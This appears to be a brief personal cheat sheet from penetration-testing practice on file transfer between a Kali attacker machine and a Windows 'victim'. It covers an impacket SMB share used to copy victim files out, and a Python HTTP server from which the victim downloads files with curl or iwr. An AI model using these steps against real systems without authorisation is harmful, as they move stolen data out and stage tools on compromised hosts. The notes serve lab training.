## SMB Share
<details>
on kali: make a folder called share and create a `test.txt` empty document then `impacket-smbserver -smb2support share ./share -username test -password test` then on victim `net use \\<kali ip>\share /user:test test` then `dir \\192.168.45.217\share` to confirm u can see the `test.txt` in /share (maybe create a test.txt in it for checking purposes) then `Copy-Item "<path to file in windows>" "\\<kali ip>\share\<filename>"`
</details>

## Python server
(download only) (I know u can start a python upload server but i haven't add that yet)
<details>
On kali, `python3 -m http.server <port>` in the folder that has the file u wanna serve

Then on victim either `curl http://<kali ip>:<port>/<filename> -o <filename>` (cmd) or `iwr -uri http://<kali ip>:<port>/<filename> -Outfile <filename>`
</details>